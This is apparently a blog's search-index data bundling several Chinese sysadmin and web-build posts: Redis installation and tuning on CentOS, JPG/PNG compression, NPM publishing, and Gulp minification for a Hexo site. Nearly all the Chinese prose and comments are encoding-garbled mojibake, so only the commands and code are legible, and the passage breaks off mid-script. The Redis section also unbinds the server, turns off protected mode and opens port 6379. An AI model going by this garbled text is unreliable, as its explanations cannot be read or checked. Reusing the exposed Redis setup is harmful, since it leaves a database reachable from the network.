ç¼–è¾‘é…ç½®æ–‡ä»¶$ vim /etc/redis.confmaxclients 10000 #æœ€å¤§è¿æ¥æ•°# bind 127.0.0.1 #æ³¨é‡Šæ‰IPç»‘å®šprotected-mode no #å…³é—­ä¿æŠ¤æ¨¡å¼requirepass yourPassword #è®¾ç½®è®¿é—®å¯†ç dir /usr/local/redis/data/ #æŒ‡å®šæ•°æ®ç›®å½•logfile "/usr/local/redis/logs/redis.log" #æŒ‡å®šæ—¥å¿—æ–‡ä»¶# æ³¨æ„ï¼šå½“å‰ä½¿ç”¨RDBæŒä¹…åŒ–æœºåˆ¶ï¼Œç”±äºRedisé»˜è®¤å¯ç”¨RDBï¼Œå› æ­¤ä¸Šé¢æ— éœ€æ‰‹åŠ¨é…ç½®ï¼Œé™¤ééœ€è¦æ›´æ”¹å¿«ç…§å­˜ç›˜çš„é¢‘ç‡ å¼€æœºè‡ªå¯åŠ¨ Redis 123456789101112131415161718192021222324252627282930# åˆ‡æ¢rootç”¨æˆ·$ sudo -i# é…ç½®rediså‰å°è¿è¡Œ# vim /usr/local/redis/conf/redis.confdaemonize no# åˆ›å»ºredisçš„supervistoré…ç½®æ–‡ä»¶# touch /etc/supervisord.d/redis.ini# ç¼–è¾‘redisçš„supervistoré…ç½®æ–‡ä»¶ï¼Œæ·»åŠ ä»¥ä¸‹é…ç½®å†…å®¹ï¼ˆè€ƒè™‘åˆ°æœåŠ¡å™¨å®‰å…¨ï¼Œå¿…é¡»æŒ‡å®šä½¿ç”¨redisç”¨æˆ·å¯åŠ¨redisæœåŠ¡ï¼‰# vim /etc/supervisord.d/redis.ini[program:redis]directory=/usr/local/rediscommand=/usr/local/redis/bin/redis-server /etc/redis.confuser=redisnumprocs=1autostart=trueautorestart=truestartretries=10process_name=%(program_name)s# é‡è½½supervistorçš„é…ç½®æ–‡ä»¶ï¼Œä¼šè‡ªåŠ¨å¯åŠ¨redisæœåŠ¡# supervisorctl reload# æŸ¥çœ‹redisçš„è¿è¡ŒçŠ¶æ€# supervisorctl status redisredis RUNNING pid 31513, uptime 0:03:23 #å¦‚æœè¾“å‡ºæ­¤æ—¥å¿—ä¿¡æ¯ï¼Œè¯´æ˜rediså¯åŠ¨æˆåŠŸï¼Œå¦åˆ™æŸ¥çœ‹redisçš„å¯åŠ¨æ—¥å¿—æ¥æ’æŸ¥é—®é¢˜# æ³¨æ„ï¼šå½“redisé€šè¿‡supervistorç®¡ç†è‡ªå¯åŠ¨çš„æƒ…å†µä¸‹ï¼Œä¸èƒ½ç®€å•ä½¿ç”¨â€œredis-cli shutdownâ€œå‘½ä»¤æ¥å…³é—­redisæœåŠ¡ï¼Œå…·ä½“çš„redisæœåŠ¡ç®¡ç†å¯å‚è€ƒä¸‹é¢çš„å†…å®¹ã€‚ é…ç½®é˜²ç«å¢™ 12345678# å¼€æ”¾ç«¯å£# firewall-cmd --zone=public --permanent --add-port=6379/tcp# ä¿å­˜é˜²ç«å¢™é…ç½®# firewall-cmd --reload# æŸ¥çœ‹å·²å¼€æ”¾çš„ç«¯å£# firewall-cmd --list-ports ç®¡ç† Redis æœåŠ¡ 1234567891011# å…³é—­# supervistorctl stop redis# å¯åŠ¨# supervistorctl start redis# é‡å¯# supervistorctl restart redis# æŸ¥çœ‹çŠ¶æ€# supervistorctl status redis é…ç½®æ¦‚è¿° 12345é…ç½®æ–‡ä»¶ï¼š/etc/redis.confå®‰è£…ç›®å½•ï¼š/usr/local/redis/æ•°æ®ç›®å½•ï¼š/usr/local/redis/dataæ—¥å¿—æ–‡ä»¶ï¼š/usr/local/redis/logs/redis.logredisçš„supervistoré…ç½®æ–‡ä»¶ï¼š/etc/supervisord.d/redis.ini Redis å¯åŠ¨é”™è¯¯ä¸€ 12344969:M 23 Nov 2018 12:57:46.920 # You requested maxclients of 10000 requiring at least 10032 max file descriptors.44969:M 23 Nov 2018 12:57:46.920 # Server can\'t set maximum open files to 10032 because of OS error: Operation not permitted.44969:M 23 Nov 2018 12:57:46.920 # Current maximum open files is 4096. maxclients has been reduced to 4064 to compensate for low ulimit. If you need higher maxclients increase \'ulimit -n\'. ä¸€èˆ¬æƒ…å†µä¸‹ï¼Œå¦‚æœå·²ç»æ›´æ”¹äº†ç³»ç»Ÿçš„æœ€å¤§æ‰“å¼€æ–‡ä»¶æè¿°ç¬¦æ•°ï¼Œä¸ä¼šå†å‡ºç°ä»¥ä¸Šçš„é”™è¯¯ä¿¡æ¯ï¼Œè¯·æ£€æŸ¥æœ€å¤§æ‰“å¼€æ–‡ä»¶æè¿°ç¬¦æ•°çš„æ›´æ”¹æ˜¯å¦ç”Ÿæ•ˆã€‚ Redis å¯åŠ¨é”™è¯¯äºŒ 123444969:M 23 Nov 2018 12:57:46.921 # WARNING: The TCP backlog setting of 511 cannot be enforced because /proc/sys/net/core/somaxconn is set to the lower value of 128.44969:M 23 Nov 2018 12:57:46.921 # Server initialized44969:M 23 Nov 2018 12:57:46.921 # WARNING overcommit_memory is set to 0! Background save may fail under low memory condition. To fix this issue add \'vm.overcommit_memory = 1\'to /etc/sysctl.conf and then reboot or run the command \'sysctl vm.overcommit_memory=1\' for this to take effect. 1234567891011# ç¼–è¾‘é…ç½®æ–‡ä»¶ï¼Œæ·»åŠ ä»¥ä¸‹å†…å®¹# vim /etc/sysctl.confvm.overcommit_memory = 1net.core.somaxconn = 1024# é‡å¯ç³»ç»Ÿ# reboot# éªŒè¯æ˜¯å¦ç”Ÿæ•ˆ# sysctl net.core.somaxconn# sysctl vm.overcommit_memory Redis å¯åŠ¨é”™è¯¯ä¸‰ 1244969:M 23 Nov 2018 12:57:46.922 # WARNING you have Transparent Huge Pages (THP) support enabled in your kernel. This will create latency and memory usage issues with Redis. To fix this issuerun the command \'echo never &gt; /sys/kernel/mm/transparent_hugepage/enabled\' as root, and add it to your /etc/rc.local in order to retain the setting after a reboot. Redis must be restarted after THP is disabled. 1234567891011121314# æ‰§è¡Œä»¥ä¸‹å‘½ä»¤# echo never &gt; /sys/kernel/mm/transparent_hugepage/enabled# ç¼–è¾‘é…ç½®æ–‡ä»¶ï¼Œåœ¨æ–‡ä»¶çš„æœ«å°¾æ·»åŠ ä»¥ä¸‹å†…å®¹# vim /etc/rc.localif test -f /sys/kernel/mm/transparent_hugepage/enabled; then echo never &gt; /sys/kernel/mm/transparent_hugepage/enabledfi# é…ç½®æ–‡ä»¶æˆæƒ# chmod +x /etc/rc.d/rc.local# é‡å¯ç³»ç»Ÿ# reboot var isMobile = navigator.userAgent.match(/(phone|pad|pod|iPhone|iPod|ios|iPad|Android|Mobile|BlackBerry|IEMobile|MQQBrowser|JUC|Fennec|wOSBrowser|BrowserNG|WebOS|Symbian|Windows Phone)/i); if (!isMobile) { try { var plugin = new ReadmorePlugin(); plugin.init({ "id": "readmore-container", "blogId": "96641-5333172926158-056", "name": "å…¨æ ˆæŠ€æœ¯é©¿ç«™", "qrcode": "https://www.techgrow.cn/img/wx_mp_qr.png", "keyword": "Tech", "lockToc": "yes", "type": "hexo", "random": "0.9", "interval": "30", "expires": "365", "height": "auto" }); } catch(e) { console.warn("readmore plugin occurred error: " + e.name + " | " + e.message); } }',tags:"centos ç¼“å­˜"},{title:"Linux å‹ç¼© JPG-PNG å›¾ç‰‡",url:"/posts/db3daf0.html",text:'Jpegoptim å‹ç¼© JPG å›¾ç‰‡ 12345678# å®‰è£…jpegoptim# yum install jpegoptim# å‹ç¼©jpgå›¾ç‰‡# jpegoptim ttlsa.jpg# æ‰¹é‡å‹ç¼©æŸç›®å½•ä¸‹æ‰€æœ‰jpgå›¾ç‰‡# for i in /data/site/image.ttlsa.com/images/*.jpg; do jpegoptim $i; done Pngcrush å‹ç¼© PNG å›¾ç‰‡ 12345678910111213141516171819202122232425262728293031# ä¸‹è½½pngcrush# wget https://jaist.dl.sourceforge.net/project/pmt/pngcrush/1.8.13/pngcrush-1.8.13.tar.gz# è§£å‹pngcrush# tar -xvf pngcrush-1.8.13.tar.gz# ç¼–è¯‘å®‰è£…pngcrush# make# cp pngcrush /usr/bin# å‹ç¼©pngå›¾ç‰‡ï¼ŒæŒ‡å®šå›¾ç‰‡å‹ç¼©åçš„æ–‡ä»¶å# pngcrush -brute pay_zfb.png pay_zfb_small.png# å‹ç¼©pngå›¾ç‰‡ï¼ŒæŒ‡å®šå›¾ç‰‡å‹ç¼©åç›´æ¥è¦†ç›–åŸå›¾ç‰‡ï¼ˆ-nå‚æ•°ï¼‰# pngcrush -brute -n bg_purple.png# å‹ç¼©pngå›¾ç‰‡ï¼ŒæŒ‡å®šå›¾ç‰‡å‹ç¼©åçš„æ–‡ä»¶æ‰©å±•åï¼ˆ-eå‚æ•°ï¼‰ï¼Œä¾‹å¦‚ä¸‹é¢å›¾ç‰‡å‹ç¼©åçš„å®Œæ•´æ–‡ä»¶åä¸ºï¼šbg_purple_small.png# pngcrush -brute -e "_small.png" bg_purple.png# æ‰¹é‡å‹ç¼©å½“å‰ç›®å½•ä¸‹æ‰€æœ‰pngå›¾ç‰‡ï¼ŒæŒ‡å®šå›¾ç‰‡å‹ç¼©åå­˜æ”¾çš„ç›®å½•ï¼ˆ-då‚æ•°ï¼‰ï¼Œä¸”å›¾ç‰‡å‹ç¼©åçš„æ–‡ä»¶åä¸å˜ï¼ˆ-nå‚æ•°ï¼‰# pngcrush -brute -d "/data/site/image.ttlsa.com/images" -n *.png# æ‰¹é‡å‹ç¼©æŸç›®å½•ä¸‹æ‰€æœ‰pngå›¾ç‰‡ï¼ŒæŒ‡å®šå›¾ç‰‡å‹ç¼©åç›´æ¥è¦†ç›–åŸå›¾ç‰‡ï¼ˆ-nå‚æ•°ï¼‰# for i in /data/site/image.ttlsa.com/images/*.png; do pngcrush -brute -n $i; done# å‚æ•°è¯´æ˜ï¼š# pngcrush --helpusage: pngcrush [options except for -e -d] infile.png outfile.png pngcrush -e ext [other options] file.png ... pngcrush -d dir/ [other options] file.png ... pngcrush -n -v file.png ... var isMobile = navigator.userAgent.match(/(phone|pad|pod|iPhone|iPod|ios|iPad|Android|Mobile|BlackBerry|IEMobile|MQQBrowser|JUC|Fennec|wOSBrowser|BrowserNG|WebOS|Symbian|Windows Phone)/i); if (!isMobile) { try { var plugin = new ReadmorePlugin(); plugin.init({ "id": "readmore-container", "blogId": "96641-5333172926158-056", "name": "å…¨æ ˆæŠ€æœ¯é©¿ç«™", "qrcode": "https://www.techgrow.cn/img/wx_mp_qr.png", "keyword": "Tech", "lockToc": "yes", "type": "hexo", "random": "0.9", "interval": "30", "expires": "365", "height": "auto" }); } catch(e) { console.warn("readmore plugin occurred error: " + e.name + " | " + e.message); } }',tags:"linux"},{title:"NPM åŒ…å‘å¸ƒ - Publish",url:"/posts/68618d42.html",text:'ç¬¬ä¸€æ­¥ï¼šæ³¨å†Œ NPM ä»“åº“å¸å· NPM å®˜ç½‘ ç¬¬äºŒæ­¥ï¼šåˆ›å»º NodeJS é¡¹ç›® 123456789101112131415161718192021# åˆ›å»ºé¡¹ç›®çš„æ ¹ç›®å½•$ mkdir test-module# è¿›å…¥é¡¹ç›®çš„æ ¹ç›®å½•$ cd test-module# åˆå§‹åŒ–å½“å‰é¡¹ç›®ï¼Œæ ¹æ®æç¤ºå¡«å†™é¡¹ç›®ä¿¡æ¯$ npm init# åˆå§‹åŒ–åï¼Œæœ€ç»ˆç”Ÿæˆpackage.jsonæ–‡ä»¶ï¼Œæ–‡ä»¶å†…å®¹ç¤ºä¾‹å¦‚ä¸‹ï¼š{ "name": "test-module", "version": "1.0.0", "description": "0.0.1", "main": "index.js", "scripts": { "test": "echo \\"Error: no test specified\\" &amp;&amp; exit 1" }, "author": "Clay", "license": "MIT"} ç¬¬ä¸‰æ­¥ï¼šç¼–å†™ NodeJS ä»£ç  12345678# è¿›å…¥é¡¹ç›®çš„æ ¹ç›®å½•$ cd test-module# åˆ›å»ºindex.jsæ–‡ä»¶$ touch index.js# å¼€å§‹ç¼–å†™ä»£ç $ vim index.js ç¬¬å››æ­¥ï¼šå‘å¸ƒé¡¹ç›®åˆ° NPM ä»“åº“ 12345678910111213141516# è¿›å…¥é¡¹ç›®çš„æ ¹ç›®å½•$ cd test-module# ç™»å½•NPMä»“åº“ï¼Œå¡«å†™ç”¨æˆ·åã€å¯†ç ã€é‚®ç®±åœ°å€$ npm login# å‘å¸ƒé¡¹ç›®ï¼Œå¦‚æœæ˜¯é¦–æ¬¡æ‰§è¡Œå‘å¸ƒå‘½ä»¤ï¼Œéœ€è¦ç™»å½•é‚®ç®±éªŒè¯é‚®ç®±åœ°å€$ npm publish# å–æ¶ˆé¡¹ç›®å‘å¸ƒ$ npm unpublish test-module --forc# æˆ–è€…å–æ¶ˆé¡¹ç›®æŒ‡å®šç‰ˆæœ¬çš„å‘å¸ƒ$ npm unpublish test-module@1.0.0 --forc# æœ€åç™»å½•NPMä»“åº“çš„ç®¡ç†é¡µé¢ï¼Œå°±å¯ä»¥çœ‹åˆ°è‡ªå·±åˆšå‘å¸ƒçš„NPMæ¨¡å—ã€‚ æ›´æ–° NPM ä»“åº“ä¸­é¡¹ç›®çš„ç‰ˆæœ¬ 12345678910111213141516171819# æŸ¥çœ‹é¡¹ç›®åœ¨NPMä»“åº“ä¸­çš„æ‰€æœ‰ç‰ˆæœ¬å·$ npm view hexo-ssl-auth versions[ \'0.0.1\' ]# æœ¬åœ°ä¿®æ”¹é¡¹ç›®çš„æºç ...# æ›´æ”¹æœ¬åœ°é¡¹ç›®çš„ç‰ˆæœ¬å·# å‚æ•° patch ä»£è¡¨è¡¥ä¸ï¼Œç‰ˆæœ¬å·çš„æœ€åä¸€ä½è‡ªåŠ¨åŠ 1# å‚æ•° minor ä»£è¡¨å°ä¿®å°æ”¹ï¼Œç‰ˆæœ¬å·çš„ç¬¬äºŒä½è‡ªåŠ¨åŠ 1# å‚æ•° major ä»£è¡¨å¤§æ”¹ï¼Œç‰ˆæœ¬å·çš„ç¬¬ä¸€ä½è‡ªåŠ¨åŠ 1$ npm version patchv0.0.2# æ›´æ”¹NPMä»“åº“ä¸­é¡¹ç›®çš„ç‰ˆæœ¬å·$ npm publish# æŸ¥çœ‹é¡¹ç›®åœ¨NPMä»“åº“ä¸­çš„æ‰€æœ‰ç‰ˆæœ¬å·[ \'0.0.1\', \'0.0.2\' ] é”™è¯¯å¤„ç†ï¼šno_perms Private mode enable, only admin can publish this module 12345678910# è¯¦ç»†çš„é”™è¯¯ä¿¡æ¯npm ERR! publish Failed PUT 403npm ERR! code E403npm ERR! no_perms Private mode enable, only admin can publish this module# é”™è¯¯åŸå› åˆ†æä½¿ç”¨çš„æ˜¯æ·˜å®æºcnpmï¼Œç™»é™†åˆ°çš„æ˜¯cnpm# è§£å†³æ–¹æ³•åˆ‡æ¢åˆ°npmçš„å®˜æ–¹æºï¼Œå¯æ‰§è¡Œå‘½ä»¤ï¼šnpm config set registry http://registry.npmjs.org/ é”™è¯¯å¤„ç†ï¼šYou do not have permission to publish â€œnpmtestâ€. Are you logged in as the correct user? 12345678910# è¯¦ç»†çš„é”™è¯¯ä¿¡æ¯npm ERR! publish Failed PUT 403npm ERR! code E403npm ERR! You do not have permission to publish "npmtest". Are you logged in as the correct user? :# é”™è¯¯åŸå› åˆ†ææ‰€è¦publishçš„åŒ…çš„nameå’ŒNPMä»“åº“ä¸­å·²ç»å‘å¸ƒçš„åŒ…çš„åå­—é‡å¤ï¼Œå› æ­¤æ²¡æœ‰æƒé™å‘å¸ƒè¿™ä¸ªåå­—çš„åŒ…ã€‚ç®€å•è§£é‡Šå°±æ˜¯åŒ…åè¢«åˆ«äººæŠ¢å…ˆæ³¨å†Œäº†# è§£å†³æ–¹æ³•ç¼–è¾‘package.jsonæ–‡ä»¶ï¼ŒæŠŠnameçš„å€¼æ¢æ‰ã€‚å¦‚æœè¿˜å‡ºç°ä¸Šè¿°é”™è¯¯å°±æ˜¯è¿˜æ˜¯é‡åçš„ï¼Œç»§ç»­æ¢ï¼ é”™è¯¯å¤„ç†ï¼šYou cannot publish over the previously published versions: 0.0.3 12345678910# è¯¦ç»†çš„é”™è¯¯ä¿¡æ¯npm ERR! publish Failed PUT 403npm ERR! code E403npm ERR! You cannot publish over the previously published versions: 0.0.3. : hexo-google-adsense# é”™è¯¯åŸå› åˆ†ææ‰€è¦publishçš„åŒ…çš„versionå°äºç­‰äºNPMä»“åº“ä¸­å·²ç»å‘å¸ƒçš„åŒ…çš„ç‰ˆæœ¬å·# è§£å†³æ–¹æ³•ç¼–è¾‘package.jsonæ–‡ä»¶ï¼ŒæŠŠversionçš„å€¼æ›´æ”¹æ‰ï¼Œå¿…é¡»å¤§äºNPMä»“åº“ä¸­å·²ç»å‘å¸ƒçš„åŒ…çš„ç‰ˆæœ¬å· var isMobile = navigator.userAgent.match(/(phone|pad|pod|iPhone|iPod|ios|iPad|Android|Mobile|BlackBerry|IEMobile|MQQBrowser|JUC|Fennec|wOSBrowser|BrowserNG|WebOS|Symbian|Windows Phone)/i); if (!isMobile) { try { var plugin = new ReadmorePlugin(); plugin.init({ "id": "readmore-container", "blogId": "96641-5333172926158-056", "name": "å…¨æ ˆæŠ€æœ¯é©¿ç«™", "qrcode": "https://www.techgrow.cn/img/wx_mp_qr.png", "keyword": "Tech", "lockToc": "yes", "type": "hexo", "random": "0.9", "interval": "30", "expires": "365", "height": "auto" }); } catch(e) { console.warn("readmore plugin occurred error: " + e.name + " | " + e.message); } }',tags:"å‰ç«¯"},{title:"Hexo ä¼˜åŒ– - åˆ©ç”¨ Gulp å‹ç¼©ä»£ç ",url:"/posts/17b9b7b0.html",text:"Gulp å‹ç¼©ä»£ç ç‰ˆæœ¬è¯´æ˜ä¸»è¦æ¨¡å—çš„ç‰ˆæœ¬å·åˆ†åˆ«ä¸ºï¼š gulp 3.9.xï¼Œgulp-babel 7.xï¼Œbabel-core 6.x 1234567891011121314151617\"babel-core\": \"^6.26.3\",\"babel-loader\": \"^7.1.5\",\"babel-preset-env\": \"^1.7.0\",\"babel-preset-es2015\": \"^6.24.1\",\"gulp\": \"^3.9.1\",\"gulp-babel\": \"^7.0.1\",\"gulp-cache\": \"^1.1.1\",\"gulp-changed\": \"^3.2.0\",\"gulp-clean\": \"^0.4.0\",\"gulp-debug\": \"^4.0.0\",\"gulp-htmlclean\": \"^2.7.22\",\"gulp-htmlmin\": \"^5.0.1\",\"gulp-imagemin\": \"^5.0.3\",\"gulp-minify-css\": \"^1.2.4\",\"gulp-uglify\": \"^3.0.2\",\"gulp-util\": \"^3.0.8\",\"imagemin-pngquant\": \"^7.0.0\" å®‰è£… NPM æ¨¡å—å…¨å±€å®‰è£…ï¼š 12345# å…¨å±€å®‰è£… Gulp 3.9$ npm install -g gulp@3.9.1# å…¨å±€æŸ¥çœ‹ Gulp çš„ç‰ˆæœ¬å·$ gulp --version å±€éƒ¨å®‰è£…ï¼š 123456789# å±€éƒ¨å®‰è£… Gulp 3.9.1$ npm install gulp@3.9.1# å±€éƒ¨å®‰è£… Babel 6$ npm install gulp-babel@7 babel-core babel-preset-env babel-loader babel-preset-es2015 --save# å±€éƒ¨å®‰è£…å…¶ä»–æ¨¡å—1ï¼‰å°†ä¸Šé¢å…¶ä»–æ¨¡å—çš„ä¾èµ–ä¿¡æ¯æ·»åŠ åˆ°åšå®¢æ ¹ç›®å½•ä¸‹çš„package.jsonæ–‡ä»¶ä¸­2ï¼‰ç„¶ååœ¨åšå®¢çš„æ ¹ç›®å½•ä¸‹ï¼Œæ‰§è¡Œå±€éƒ¨å®‰è£…å‘½ä»¤ï¼šnpm install åˆ›å»º Gulp é…ç½®æ–‡ä»¶åœ¨ Hexo åšå®¢çš„æ ¹ç›®å½•ä¸‹åˆ›å»º gulpfile.js é…ç½®æ–‡ä»¶ï¼Œå¹¶å†™å…¥ä»¥ä¸‹å†…å®¹ï¼š 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960var gulp = require('gulp');var gutil = require('gulp-util');var clean = require('gulp-clean');var debug = require('gulp-debug');var cache = require('gulp-cache');var babel = require('gulp-babel');var uglify = require('gulp-uglify');var changed = require('gulp-changed');var htmlmin = require('gulp-htmlmin');var imagemin = require('gulp-imagemin');var htmlclean = require('gulp-htmlclean');var minifycss = require('gulp-minify-css');var pngquant = require('imagemin-pngquant');// å‹ç¼©cssæ–‡ä»¶gulp.task('minify-css', function() { return gulp.src('./public/css/**/*.css') .pipe(minifycss()) .pipe(gulp.dest('./public/css'));});// å‹ç¼©jsæ–‡ä»¶ï¼Œæ”¯æŒå°†ES6ä»£ç è½¬æ¢æˆES5ä»£ç gulp.task('minify-js', function() { return gulp.src('./public/lib/**/*.js') .pipe(babel({ presets: ['es2015'] })) .pipe(uglify()) .pipe(gulp.dest('./public/lib'));});// å‹ç¼©htmlæ–‡ä»¶gulp.task('minify-html', function() { return gulp.src('./public/**/*.html') .pipe(htmlclean()) .pipe(htmlmin({ removeComments: true, minifyJS: true, minifyCSS: true, minifyURLs: true, })) .pipe(gulp.dest('./public'));});// å‹ç¼©å›¾ç‰‡(æ·±åº¦å‹ç¼©)gulp.task('minify-images', function() { gulp.src('./public/asset/**/*.{png,jpg,gif,ico}') .pipe(cache(imagemin({ //å¯ç”¨ç¼“å­˜ï¼Œåªå‹ç¼©å‘ç”Ÿå˜åŒ–çš„å›¾ç‰‡ progressive: true, //æ˜¯å¦æ— æŸå‹ç¼©jpgå›¾ç‰‡ interlaced: false, //æ˜¯å¦éš”è¡Œæ‰«ægifè¿›è¡Œæ¸²æŸ“ svgoPlugins: [{removeViewBox: false}], //æ˜¯å¦ç§»é™¤svgçš„viewboxå±æ€§ multipass: false, //æ˜¯å¦å¤šæ¬¡ä¼˜åŒ–svgç›´åˆ°å®Œå…¨ä¼˜åŒ– optimizationLevel: 5, //ä¼˜åŒ–ç­‰çº§ï¼Œå–å€¼èŒƒå›´ï¼š0-7ï¼Œé»˜è®¤å€¼ï¼š3 use: [pngquant()] //ä½¿ç”¨pngquantæ·±åº¦å‹ç¼©pngå›¾ç‰‡çš„imageminæ’ä»¶ }))) .pipe(gulp.dest('./public/asset'));});// gulp3çš„å†™æ³•gulp.task('default', ['minify-css', 'minify-js', 'minify-images', 'minify-html']); Gulp æ‰§è¡Œå‹ç¼©ä»»åŠ¡1234567891011121314151617181920# è¿›å…¥åšå®¢æ ¹ç›®å½•$ cd /blogroot# æ‰§è¡ŒæŒ‡å®šçš„å‹ç¼©ä»»åŠ¡ï¼ˆå¦‚å‹ç¼©CSSï¼‰$ gulp minify-css# æ‰§è¡Œå…¨éƒ¨å‹ç¼©ä»»åŠ¡$ gulp[09:35:19] Using gulpfile /blogroot/gulpfile.js[09:35:19] Starting 'minify-css'...[09:35:19] Starting 'minify-js'...[09:35:19] Starting 'minify-images'...[09:35:19] Finished 'minify-images' after 6.59 ms[09:35:19] Starting 'minify-html'...[09:35:20] Finished 'minify-css' after 739 ms[09:35:27] Finished 'minify-js' after 7.78 s[09:40:51] Finished 'minify-html' after 5.52 min[09:40:51] Starting 'default'...[09:40:51] Finished 'default' after 34 Î¼s[09:40:52] gulp-imagemin: Minified 122 images Gulp ä½¿ç”¨ä¼˜åŒ–Gulp åªå‹ç¼©ä¿®æ”¹è¿‡çš„æ–‡ä»¶ ä¸Šé¢çš„ä»£ç ï¼Œé»˜è®¤ä¼šå‹ç¼©æ‰«æå¾—åˆ°çš„æ‰€æœ‰æ–‡ä»¶ï¼ˆé™¤äº†å›¾ç‰‡ä»¥å¤–ï¼‰ï¼Œæ•ˆç‡å’Œæ€§èƒ½éƒ½éå¸¸ä½ã€‚æ­¤æ—¶å¯ä»¥å®‰è£… gulp-changed æ¨¡å—ï¼Œæ§åˆ¶ Gulp åªå‹ç¼©ä¿®æ”¹è¿‡çš„æ–‡ä»¶ï¼ˆä»£ç å¦‚ä¸‹ï¼‰ã€‚ æ¯æ¬¡è¿è¡Œä¸‹é¢çš„ä»£ç ä¹‹åï¼Œå¦‚æœæ¥ç€æ‰§è¡Œ hexo clean å‘½ä»¤ï¼Œå†æ‰§è¡Œå‹ç¼©æ“ä½œä¼šå‘ç° Gulp ä¾ç„¶ä¼šå‹ç¼©æ‰€æœ‰æ–‡ä»¶ã€‚å»ºè®®é…åˆä½¿ç”¨ gulp-cache æˆ–è€… gulp-cached æ¨¡å—æ¥è§£å†³å‹ç¼©ç¼“å­˜çš„é—®é¢˜ï¼Œä¹Ÿå¯ä»¥è‡ªè¡Œå®ç°å‹ç¼©ç¼“å­˜æœºåˆ¶ï¼ˆå†…å­˜ç¼“å­˜ + ç£ç›˜ç¼“å­˜ï¼‰ã€‚ å¦‚æœå‹ç¼©ç¼“å­˜æ–¹æ¡ˆä¾èµ–æ–‡ä»¶çš„ Hash å€¼ï¼Œä¸” Hexo ä½¿ç”¨äº† Yilia ä¸»é¢˜ï¼Œåˆ™å¿…é¡»ä¿è¯ Hexo ç”Ÿæˆçš„æ ‡ç­¾ï¼ˆTagï¼‰åˆ—è¡¨æ˜¯æœ‰é¡ºåºçš„ï¼Œå¦åˆ™ Hexo æ¯æ¬¡æ‰§è¡Œ clean ä¸ generate æ“ä½œåï¼ŒHTML æ–‡ä»¶çš„ Hash å€¼éƒ½ä¸ä¸€æ ·ï¼Œæœ€ç»ˆå¯¼è‡´æ¯æ¬¡éƒ½ä¼šå‹ç¼© HTML æ–‡ä»¶ï¼›å»ºè®®ä¿®æ”¹ Hexo ä¸»é¢˜çš„ JS ä»£ç ï¼Œä½¿æ¯æ¬¡ç”Ÿæˆçš„æ ‡ç­¾åˆ—è¡¨éƒ½ä¸€æ ·ã€‚ å¦‚æœå®‰è£…äº†ç¬¬ä¸‰æ–¹æ’ä»¶ï¼Œå¯èƒ½ä¹Ÿä¼šå½±å“æ–‡ä»¶çš„ Hash å€¼ï¼Œä¾‹å¦‚ï¼šæ–‡ç« åŠ å¯†æ’ä»¶ã€‚ 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576777879808182838485868788899091var gulp = require('gulp');var gutil = require('gulp-util');var clean = require('gulp-clean');var debug = require('gulp-debug');var cache = require('gulp-cache');var babel = require('gulp-babel');var uglify = require('gulp-uglify');var changed = require('gulp-changed');var htmlmin = require('gulp-htmlmin');var imagemin = require('gulp-imagemin');var htmlclean = require('gulp-htmlclean');var minifycss = require('gulp-minify-css');var pngquant = require('imagemin-pngquant');// å‹ç¼©cssæºæ–‡ä»¶(åªå‹ç¼©ä¿®æ”¹è¿‡çš„æºæ–‡ä»¶)gulp.task('generate-minify-css', function() { return gulp.src('./public/css/**/*.css') .pipe(changed('/tmp/blog/css/', {extension:'.css', hasChanged: changed.compareContents})) .pipe(minifycss()) .pipe(gulp.dest('/tmp/blog/css/')) .pipe(debug({title: 'å‹ç¼©cssæºæ–‡ä»¶:'}));});// æ‹·è´ç»å‹ç¼©çš„cssæºæ–‡ä»¶(åªæ‹·è´ä¿®æ”¹è¿‡çš„å‹ç¼©æºæ–‡ä»¶)gulp.task('copy-minify-css', ['generate-minify-css'], function() { return gulp.src('/tmp/blog/css/**/*.css') .pipe(changed('./public/css/', {extension:'.css', hasChanged: changed.compareContents})) .pipe(gulp.dest('./public/css/')) .pipe(debug({title: 'æ‹·è´ç»å‹ç¼©çš„cssæºæ–‡ä»¶:'}));});// å‹ç¼©jsæºæ–‡ä»¶(åªå‹ç¼©ä¿®æ”¹è¿‡çš„æºæ–‡ä»¶),æ”¯æŒå°†ES6ä»£ç è½¬æ¢æˆES5ä»£ç gulp.task('generate-minify-js', function() { return gulp.src('./public/lib/**/*.js') .pipe(changed('/tmp/blog/lib/', {extension:'.js', hasChanged: changed.compareContents})) .pipe(babel({presets: ['es2015']})) .pipe(uglify()) .pipe(gulp.dest('/tmp/blog/lib/')) .pipe(debug({title: 'å‹ç¼©jsæºæ–‡ä»¶:'}));});// æ‹·è´ç»å‹ç¼©çš„jsæºæ–‡ä»¶(åªæ‹·è´ä¿®æ”¹è¿‡çš„å‹ç¼©æºæ–‡ä»¶)gulp.task('copy-minify-js', ['generate-minify-js'], function() { return gulp.src('/tmp/blog/lib/**/*.js') .pipe(changed('./public/lib/', {extension:'.js', hasChanged: changed.compareContents})) .pipe(gulp.dest('./public/lib/')) .pipe(debug({title: 'æ‹·è´ç»å‹ç¼©çš„jsæºæ–‡ä»¶:'}));});// å‹ç¼©htmlæºæ–‡ä»¶(åªå‹ç¼©ä¿®æ”¹è¿‡çš„æºæ–‡ä»¶)gulp.task('generate-minify-html', function() { return gulp.src('./public/**/*.html') .pipe(changed('/tmp/blog/', {extension:'.html', hasChanged: changed.compareContents})) .pipe(htmlclean()) .pipe(htmlmin({ removeComments: true, minifyJS: true, minifyCSS: true, minifyURLs: true, })) .pipe(gulp.dest('/tmp/blog/')) .pipe(debug({title: 'å‹ç¼©htmlæºæ–‡ä»¶:'}));});// æ‹·è´ç»å‹ç¼©çš„htmlæºæ–‡ä»¶(åªæ‹·è´ä¿®æ”¹è¿‡çš„å‹ç¼©æºæ–‡ä»¶)gulp.task('copy-minify-html', ['generate-minify-html'], function() { return gulp.src('/tmp/blog/**/*.html') .pipe(changed('./public/', {extension:'.html', hasChanged: changed.compareContents})) .pipe(gulp.dest('./public/')) .pipe(debug({title: 'æ‹·è´ç»å‹ç¼©çš„htmlæºæ–‡ä»¶:'}));});// å‹ç¼©å›¾ç‰‡ï¼ˆæ·±åº¦å‹ç¼©ï¼‰gulp.task('minify-images', function() { gulp.src('./public/asset/**/*.{png,jpg,gif,ico}') .pipe(cache(imagemin({ //å¯ç”¨ç¼“å­˜ï¼Œåªå‹ç¼©å‘ç”Ÿå˜åŒ–çš„å›¾ç‰‡ progressive: true, //æ˜¯å¦æ— 